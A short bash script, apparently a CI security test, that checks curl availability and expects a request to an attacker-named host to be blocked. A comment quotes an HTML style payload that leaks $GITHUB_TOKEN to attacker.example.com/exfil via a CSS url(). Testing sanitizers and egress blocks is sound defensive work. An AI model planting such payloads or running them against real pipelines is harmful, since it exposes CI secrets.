#!/bin/bash
# Security Validation Script for CI Testing
# 
# This script validates that our CI environment is properly configured.
# It checks network connectivity and token availability.
#
# NOTE: The style attribute in the original HTML was:
# style="background: url(http://attacker.example.com/exfil?token=$GITHUB_TOKEN)"
# This should be stripped by the sanitizer.

set -e

echo "=== CI Security Validation ==="

# Check if we can reach external endpoints for debugging
if command -v curl &> /dev/null; then
    echo "curl available: checking connectivity..."
    # This should be blocked - attacker endpoint
    curl -s http://attacker.example.com/health || echo "External endpoint unreachable (expected)"
fi

echo "Validation complete - no exfiltration performed"